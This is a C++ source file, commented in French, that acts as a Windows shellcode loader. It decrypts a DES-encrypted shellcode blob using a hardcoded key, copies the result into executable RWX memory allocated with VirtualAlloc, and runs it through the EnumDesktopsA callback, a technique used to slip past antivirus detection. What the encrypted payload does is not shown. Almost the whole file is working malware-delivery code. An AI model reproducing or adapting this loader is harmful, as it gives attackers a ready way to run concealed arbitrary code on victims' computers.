#include <openssl/des.h>
#include <string.h>
#include <iostream>
#include <iomanip>
#include <windows.h>

int main() {
    DES_cblock key = {'m', 'e', 'o', 'w', 'm', 'e', 'o', 'w'}; // Clé de 8 octets
    DES_key_schedule schedule;
    DES_set_key_unchecked(&key, &schedule);
    
    //if (DES_set_key_checked(&key, &schedule)) {
    //    std::cerr << "Erreur lors de la création de la clé DES" << std::endl;
    //    return 1;
    //}

    // Shellcode à décoder
    unsigned char shellcode[] = 
        "\xbb\x0d\x42\x6d\xdf\x74\x2d\xb2\x78\x5d\x71\x71\xcb\x15"
        "\xbb\x3f\xb7\x5a\x84\x9a\x5e\x7a\x55\xde\xbd\x93\xec\x59"
        "\x69\xf2\x2f\xfd\x91\x73\x46\x18\x9e\x7f\x2f\xe4\xa6\xf9"
        "\x89\x00\x3a\x59\xba\xbe\x6b\x85\x7d\xd7\xe2\xa1\x53\x13"
        "\xfb\x5b\x9f\x4c\x87\x2f\x59\x66\x39\xe6\xd0\x7d\x8c\x3b"
        "\x2f\x6b\x94\x65\x47\x83\x19\x41\xe3\xcf\xf2\xbc\x53\xc8"
        "\xc1\xaf\x3e\x53\x49\xb3\xb2\xc9\xc2\xdc\x54\x57\xa2\xd5"
        "\x3b\x2a\x09\x0a\x75\xca\x48\x8c\x9d\x10\x05\x6d\x05\xe9"
        "\xe4\x3a\x7e\xee\xf0\x3b\xbe\x04\x24\x8a\xbb\xff\x38\x1b"
        "\xc3\xfa\x14\x89\x2f\xeb\xe5\xbd\x5c\x29\xb5\x4a\x21\x18"
        "\x1f\x4d\x48\x96\xff\xa6\x07\x7e\x67\x45\x01\xc6\x99\x91"
        "\xd7\x92\xa5\xd3\xfa\x7a\xfe\x00\x02\x19\xe5\x25\x9c\x51"
        "\x1f\xa5\xb9\x12\xe5\x63\x39\x4c\xbf\x3e\xd1\x0e\x12\x43"
        "\x8a\xae\x30\xc7\x9d\x97\x0b\xad\xe8\xe0\xc4\xae\x2d\x13"
        "\x54\x3b\x14\x1e\xbf\x9f\x64\xca\xcd\x8e\xc1\x78\xe7\x43"
        "\x42\x90\x6a\x81\x55\x40\xfa\x67\x72\x83\x5c\x03\x20\xe7"
        "\xef\x22\xd0\xcd\x00\x99\x4d\x5c\x84\x49\xff\x74\x4a\x28"
        "\x74\xdd\xf3\xc0\xa1\x4c\x0d\x9f\x5f\xc5\xfc\xde\x34\x96"
        "\xa8\x46\x37\xb9\xe2\x68\x60\x97\x53\xb6\x7d\x14\x5d\x09"
        "\x1a\x63\x9a\xe7\x78\xc4\xf3\x57\x63\x7a\x45\x1b\x8a\xb7"
        "\x37\x3b\x4a\x5a\x03\x2e\xf3\x3b\xa9\x9b\xb4\xf0\x58\xa5"
        "\xb7\xc4\x47\x6c\x5f\xad\x30\xe7\x23\x84\x41\xd5\x14\x33"
        "\x6d\x84\x95\xdd\x98\x8b\xe7\x5f\x61\x60\xcf\x8b";

    
    unsigned char decrypted[sizeof(shellcode)];

    size_t inputSize = sizeof(shellcode) - 1; // excluding the null terminator
    size_t numBlocks = inputSize / 8 + (inputSize % 8 == 0 ? 0 : 1);
    unsigned char output[numBlocks * 8];
    
    char paddedInput[512]; // Adjust the size as needed
    memcpy(paddedInput, shellcode, inputSize);
    
    // Déchiffrement
    for (size_t i = 0; i < numBlocks; ++i) {
        DES_ecb_encrypt((DES_cblock*)(paddedInput + i * 8), (DES_cblock*)(decrypted + i * 8), &schedule, DES_DECRYPT);
    }

    std::cout << std::endl << "Decrypted shellcode: " << std::endl;
    for (int i = 0; i < numBlocks * 8; ++i) {
        std::cout << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)(unsigned char)decrypted[i];
    }
    
    std::cout << std::endl;

    unsigned int my_payload_len = sizeof(decrypted);
    
    LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    RtlMoveMemory(mem, decrypted, my_payload_len);
    EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
    
    return 0;
}